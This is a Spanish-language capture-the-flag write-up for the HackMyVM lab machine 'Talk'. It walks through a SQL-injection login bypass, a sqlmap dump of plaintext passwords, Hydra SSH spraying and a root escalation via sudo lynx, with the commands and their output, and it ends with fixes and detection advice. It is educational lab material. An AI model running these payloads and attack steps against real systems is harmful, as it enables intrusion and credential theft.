Descripción

Talk es una máquina Linux de nivel Easy en HackMyVM. Simula un servidor de chat corporativo con una aplicación PHP (chatME) sobre nginx. El formulario de login es vulnerable a SQL Injection clásica, lo que permite extraer la base de datos completa con sqlmap. Las contraseñas están almacenadas en texto plano, facilitando el acceso SSH por credential spraying. La escalada de privilegios explota un permiso sudo NOPASSWD sobre el binario lynx — un browser de texto que puede leer archivos del sistema como root (GTFOBins).

Reconocimiento

Paso 1 — Nmap (dos fases)

Descubrimiento de puertos y versiones

¿Por qué este comando?

La estrategia de dos fases optimiza el tiempo: primero un escaneo rápido de todos los puertos (-p- --open) para identificar qué está abierto, y luego un análisis detallado (-sC -sV) solo en los puertos encontrados. Hacer -sC -sV sobre los 65535 puertos sería mucho más lento.

nmap -p- --open -n -T4 -sS 10.0.2.18
-p- → escanea los 65535 puertos TCP, no solo el top 1000
--open → muestra solo puertos en estado OPEN
-n → deshabilita resolución DNS (más rápido)
-T4 → plantilla agresiva: timeouts cortos, mayor velocidad
-sS → SYN scan (semisigiloso, no completa el handshake TCP)
nmap -p22,80 -sC -sV -n 10.0.2.18
-p22,80 → solo los puertos abiertos encontrados en Fase 1
-sC → scripts NSE por defecto (detecta cookies, headers, títulos web)
-sV → detecta versiones exactas de cada servicio

  • httponly flag not set → la cookie PHPSESSID es robable vía XSS — misconfiguration adicional
  • Solo 2 servicios = superficie reducida. El vector es claramente HTTP
Decisión

Puerto 80 con app PHP de chat. Investigar el formulario de login — candidato inmediato para SQL Injection.

3

SQL Injection — Bypass de Autenticación

Paso 2 — SQLi manual en login

Bypass de autenticación con payload clásico

¿Qué es SQL Injection y por qué lo probamos aquí?

SQL Injection ocurre cuando el input del usuario se concatena directamente en una query SQL sin sanitizar. El login de chatME muestra credenciales incorrectas sin bloqueo ni captcha — señal de un formulario vulnerable. El payload ' OR 1=1-- - es el primer test estándar: cierra el string, inyecta una condición siempre verdadera, y comenta el resto de la query.

Query original: SELECT * FROM user WHERE username='admin' AND password='admin'
Con payload: SELECT * FROM user WHERE username='' OR 1=1 -- -' AND password='...' ← siempre TRUE → devuelve primer usuario
curl -s -L -d "username=%27+OR+1%3D1--+-&password=%27+OR+1%3D1--+-" http://10.0.2.18/login.php
-s → silent (sin barra de progreso)
-L → seguir redirecciones (303 → home.php si login exitoso)
-d "username=...&password=..." → enviar como POST con los payloads URL-encoded
%27 → ' (comilla) | %3D → = | --+- → comentario SQL
Output — respuesta del servidor
<title>chatME</title>
<link rel="stylesheet" href="css/home.css">
<table id="chat_room"...>
  <th><h4>Hi, <a href="profile.php?userid=1">PaoPao</a>
  — <a href="logout.php">Logout</a></h4></th>
  <td>Welcome to chatME!</td>

HTTP redirect → home.php (200 OK)
¿Qué nos dice este output?
  • Redirigió a home.php con sesión activa → bypass de login confirmado
  • El usuario autenticado es PaoPao (userid=1) — el primer registro de la tabla
  • El panel muestra un chat con mensajes de otros usuarios — posible info adicional
  • La app es vulnerable a SQLi básica sin ningún tipo de WAF ni sanitización
Decisión

SQLi confirmada. Usar sqlmap para extraer la base de datos completa con credenciales de todos los usuarios.

sqlmap — Extracción de Base de Datos

Paso 3 — sqlmap con petición capturada

Dump completo de credenciales

¿Qué es sqlmap y por qué usarlo aquí?

sqlmap automatiza la detección y explotación de SQL Injection. Mientras el bypass manual confirma la vulnerabilidad, sqlmap nos permite extraer la estructura completa de la base de datos (tablas, columnas, datos) sin construir payloads manualmente. Se le pasa la petición HTTP capturada con BurpSuite para que use exactamente la misma estructura de la petición vulnerable.

Primero capturamos la petición POST del login en BurpSuite y la guardamos en request.txt:

request.txt — petición capturada
POST /login.php HTTP/1.1
Host: 10.0.2.18
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=ghostops1234

username=admin&password=admin
sqlmap -r request.txt --batch -D chat -T user --dump
-r request.txt → leer la petición HTTP desde archivo (incluye cookies, headers, body completo)
--batch → responder automáticamente a todas las preguntas interactivas con el valor por defecto
-D chat → seleccionar la base de datos "chat" (la de la aplicación)
-T user → seleccionar la tabla "user"
--dump → volcar todos los registros de la tabla seleccionada
Output sqlmap — tipo de inyección detectado

Hydra — Credential Spraying SSH

Paso 4 — Hydra SSH con wordlists

Validar qué credenciales de la DB funcionan en SSH

¿Por qué credential spraying y no usar directamente las credenciales?

Tenemos 5 usuarios pero no sabemos cuáles tienen cuenta SSH. Las contraseñas están "cruzadas" (jerry tiene la de nona, etc.) — no podemos saber de memoria qué combinación funciona. Hydra prueba todas las combinaciones en paralelo y nos confirma cuáles son válidas en segundos.

hydra -L users.txt -P pass.txt ssh://10.0.2.18 -t 4 -I
-L users.txt → lista de usuarios (david, jerry, nona, pao, tina)
-P pass.txt → lista de contraseñas (5 contraseñas del dump)
ssh://10.0.2.18 → protocolo SSH y host objetivo
-t 4 → 4 tareas paralelas (SSH rechaza demasiadas conexiones simultáneas)
-I → ignorar sesión previa, comenzar desde cero
Output Hydra

[22][ssh] host: 10.0.2.18   login: david   password: davidwhatpass

Privilege Escalation — sudo lynx (GTFOBins)

Paso 6 — sudo lynx como root

Escalada via browser de texto con permiso sudo NOPASSWD

¿Qué es GTFOBins y por qué lynx es peligroso con sudo?

GTFOBins (Get The F*** Out Binaries) es un catálogo de binarios Unix que pueden ser explotados para escalar privilegios cuando se ejecutan con permisos elevados. lynx es un navegador web de texto que puede abrir archivos locales con file:///path o directamente con su ruta. Al ejecutarse con sudo, hereda los permisos de root y puede acceder a cualquier archivo del sistema, incluyendo /root/root.txt.

Técnica 1: Leer archivo directamente (más rápido)

sudo lynx /root/root.txt
sudo → ejecutar el siguiente comando como root (permitido por el sudoers NOPASSWD)
lynx → navegador de texto que puede abrir archivos locales además de URLs
/root/root.txt → archivo al que solo root tiene acceso normalmente
lynx muestra el contenido del archivo como root
                          talktomeroot

   Arrow keys: Up and Down to move. Right to follow a link; Left to go back.
 H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history list

Técnica 2: Shell interactiva como root (alternativa)

sudo lynx # dentro de lynx: presionar SHIFT+! (exclamación mayúscula)
SHIFT+! → dentro de lynx, lanza el shell por defecto del sistema heredando los permisos del proceso (root)
Output: "Spawning your default shell. Use 'exit' to return to Lynx." → bash como root
Shell root via SHIFT+!
Spawning your default shell.  Use 'exit' to return to Lynx.

root@talk:/home/nona# whoami
root
root@talk:/home/nona# cat /root/root.txt
talktomeroot
¿Por qué ambas técnicas funcionan?
  • Técnica 1 (leer archivo): lynx puede abrir rutas de archivos locales como si fueran URLs. Al ejecutarse como root vía sudo, puede leer cualquier archivo del sistema, incluso los solo accesibles por root.
  • Técnica 2 (shell): lynx tiene un mecanismo para "salir temporalmente a la shell" vía SHIFT+!. Esta shell hereda el usuario del proceso lynx — root — dando control total del sistema.
  • Ambas técnicas están documentadas en GTFOBins/lynx

Análisis Ghost-Ops — 3 Agentes

Red Team Operator

Vector inmediato: SQLi en login → sqlmap time-based blind → DB dump. Credenciales en texto plano = spray SSH directo. Privesc en 1 comando: sudo lynx lee root.txt sin shell interactiva. Cadena completa en ~15 minutos, 6 comandos.

Blue Team Analyst

Nivel de ruido: MEDIO. sqlmap time-based genera requests lentos pero numerosos (detectable en logs nginx). Hydra SSH deja múltiples failed-auth en auth.log antes de los éxitos. sudo lynx no genera alertas (binario legítimo del sistema).

Black Hat Mindset

Las contraseñas están "cruzadas" — cada usuario tiene la contraseña de otro. El bypass manual reveló userid=1 (PaoPao), no el admin. El puerto 80 con cookie sin httponly sugiere XSS adicional. sudo lynx podría exfiltrar /etc/shadow o SSH keys como vectores alternativos.

Análisis de Vulnerabilidades

Vuln 1 — SQL Injection en login (CRÍTICA)

OWASP A03:2021 — Injection | CWE-89: SQL Injection

La aplicación construye la query SQL concatenando directamente el input del usuario sin sanitizar ni usar prepared statements.

❌ Código vulnerable
$q = "SELECT * FROM user WHERE username='".$_POST['username']."' AND password='".$_POST['password']."'";

Input del usuario insertado directamente → SQLi trivial

✅ Fix correcto
$stmt = $pdo->prepare("SELECT * FROM user WHERE username=? AND password=?"); $stmt->execute([$user, $pass]);

Prepared statements → el input nunca es código SQL

Vuln 2 — Contraseñas en texto plano (CRÍTICA)

OWASP A02:2021 — Cryptographic Failures | CWE-256: Unprotected Credentials

La tabla user almacena contraseñas en texto plano. Si la DB es comprometida (vía SQLi u otros vectores), todas las contraseñas son inmediatamente utilizables — sin necesidad de crackeo.

Fix: Usar bcrypt, Argon2id o scrypt con un factor de coste apropiado. Nunca MD5/SHA1 para contraseñas.

Vuln 3 — sudo NOPASSWD sobre binario GTFOBin (ALTA)

CWE-269: Improper Privilege Management | MITRE T1548.003

Conceder sudo NOPASSWD a un browser de texto (lynx) es equivalente a dar acceso root al usuario. Cualquier herramienta que pueda leer archivos, ejecutar comandos o abrir shells es un vector de escalada garantizado.

Fix: Auditar el archivo /etc/sudoers regularmente. Nunca dar sudo a browsers, editores, intérpretes o cualquier binario en GTFOBins.

Vuln 4 — Cookie de sesión sin httponly (MEDIA)

OWASP A05:2021 — Security Misconfiguration | CWE-1004

La cookie PHPSESSID no tiene el flag httponly, lo que permite su robo mediante XSS. Combinado con el SQLi, un atacante podría robar sesiones activas de otros usuarios.

Fix: session.cookie_httponly = 1 en php.ini, o ini_set('session.cookie_httponly', 1) en el código.

Lecciones Aprendidas

⚔️ Para el Atacante

  • Login form + PHP = probar siempre ' OR 1=1-- - como primer test de SQLi
  • DB con contraseñas en texto plano → spray inmediato contra SSH, FTP y todos los servicios disponibles
  • sudo -l es siempre el primer comando post-foothold — revisar GTFOBins para cualquier binario listado
  • sudo lynx /ruta/archivo lee archivos como root directamente — más limpio que buscar una shell
  • Contraseñas "cruzadas" en apps de chat: el usuario puede tener la contraseña de otro — probar TODAS las combinaciones

🛡️ Para el Defensor

  • Activar WAF con reglas SQLi en nginx (ModSecurity, NAXSI)
  • Logs nginx: alertar sobre OR 1=1, UNION SELECT, SLEEP( en parámetros POST
  • auth.log: más de 5 failed SSH en 60s desde misma IP → ban automático (fail2ban)
  • Auditar sudo -l de todos los usuarios regularmente — especialmente NOPASSWD
  • Nunca almacenar contraseñas en texto plano — bcrypt con cost factor ≥12
  • IOCs: hydra establece múltiples conexiones SSH simultáneas con diferentes usuarios en pocos segundos
